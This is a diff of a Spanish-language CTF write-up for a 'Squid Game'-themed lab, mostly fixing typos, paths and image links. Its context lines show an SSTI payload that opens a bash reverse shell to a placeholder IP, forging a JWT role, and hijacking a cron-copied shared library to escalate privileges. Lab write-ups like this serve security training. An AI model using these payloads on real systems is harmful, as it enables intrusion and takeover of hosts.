@@ -31,11 +31,12 @@ Este CTF emula una infraestructura con temática de la serie "Squid Game".
 
 ![image_desc](img/2025-11-27-194551_1351x588_scrot 1.png)
 
-Después de jugar "luz-roja luz verde" en el sitio web expuesto en el puerto 8080 nos dan una pista:
+Después de jugar "luz-roja luz-verde" en el sitio web expuesto en el puerto 8080 nos dan una pista:
 
 ![image_desc](img/2025-11-27-194801_1348x600_scrot.png)
 
 Esto sugiere STTI en uno de los campos del formulario que actualiza la información del jugador. PoC: `{{ 2+2 }}`
+
 Sabemos que usa PHP asi que probamos con una carga útil para garantizarnos una reverse shell en <INSERTAR STTI\>:  `{{ system("/bin/bash -i >& /dev/tcp/<IP>/<PUERTO> 0>&1)" }}`
 
 ![image_desc](img/2025-11-27-194840_1346x477_scrot.png)
@@ -103,9 +104,9 @@ if __name__ == "__main__":
     main()
 ```
 
-![image_desc](img/2025-11-27-205151_1337x530_scrot 1.png)
+![image_desc](img/2025-11-27-205151_1337x530_scrot%201.png)
 
-En `var/www/html/prize-only-for-the-worthy-62t1etlet7/prize.txt` encontramos la segunda flag y unas credenciales:
+En `/var/www/html/prize-only-for-the-worthy-62t1etlet7/prize.txt` encontramos la segunda flag y unas credenciales:
 
 ![image_desc](img/2025-11-27-205350_772x335_scrot.png)
 
@@ -149,11 +150,11 @@ b4,g,lsb,xy         .. text: "3R5Wwxud"
 b4,b,lsb,xy         .. text: "22\"3U2\"#3UD!"
 ```
 
-De `main.js` podemos observar que la aplicación usa JWT para autenticación. Como vimos al intentar acceder a `/organs` anteriormente esta página es "solo para el rol worker".
+De `main.js` podemos observar que la aplicación usa JWT para autenticación. Como vimos al intentar acceder a `/organs` anteriormente, esta página es "solo para el rol worker".
 
 Revisamos el JWT que tenemos:
 
-![image_desc](img/2025-11-27-213410_1366x768_scrot 1.png)
+![image_desc](img/2025-11-27-213410_1366x768_scrot%201.png)
 
 Modificamos el campo `role` para convertirnos en un trabajador y firmamos el JWT con el secreto encontrado:
 
@@ -161,7 +162,7 @@ Modificamos el campo `role` para convertirnos en un trabajador y firmamos el JWT
 
 Ahora podemos acceder a `/organs` para obtener la tercera flag:
 
-![image_desc](img/2025-11-27-213420_1366x768_scrot 1.png)
+![image_desc](img/2025-11-27-213420_1366x768_scrot%201.png)
 
 ## Flag 4 -- Structured Query Language Injection (SQLi)
 
@@ -497,14 +498,14 @@ En `/etc/cronjob` encontramos una tarea programada que ejecuta `/bin/update-lib.
 
 ![image_desc](img/2025-11-27-220717_1366x768_scrot.png)
 
-Identificamos que está empaquetado con UPX usando `strings squid | grep UPX` y lo desempaquetamos con `upx -d squid`
+Identificamos que está empaquetado con UPX usando `strings squid | grep UPX` y lo desempaquetamos con `upx -d squid`.
 
 ```
  ./squid
 Usage: ./squid <key>
 ```
 
-Analizando el binario con permisos SUID en Ghidra vemos que contiene la cadena "This_Is_Not_The_Flag_its_The_Decoded_Key". Además contiene codificada la librería `libsquid.so`y la cadena `run_helper` en base64.  Si introducimos la clave correcta el programa carga `libsquid.so` con `dlopen`, busca el símbolo `run_helper` con `dlsym` y lo invoca:
+Analizando el binario con permisos SUID en Ghidra vemos que contiene la cadena "This_Is_Not_The_Flag_its_The_Decoded_Key". Además contiene codificadas las cadenas `libsquid.so` y `run_helper` en base64.  Si introducimos la clave correcta el programa carga `libsquid.so` con `dlopen`, busca el símbolo `run_helper` con `dlsym` y lo invoca:
 
 ```C
   plaintext_pass = "This_Is_Not_The_Flag_its_The_Deco ded_Key";
@@ -726,7 +727,7 @@ print(input.decode())
 Failed to load lib:
 ```
 
-`/bin/update-lib.sh` copia la libreria en `/home/jack/dev/libsquid.so` en `/lib`. Compilamos una librería maliciosa y la ponemos en ese sitio:
+`/bin/update-lib.sh` copia la libreria de `/home/jack/dev/libsquid.so` a `/lib`. Compilamos una librería maliciosa y la ponemos en ese sitio:
 
 ```C
 #include <unistd.h>
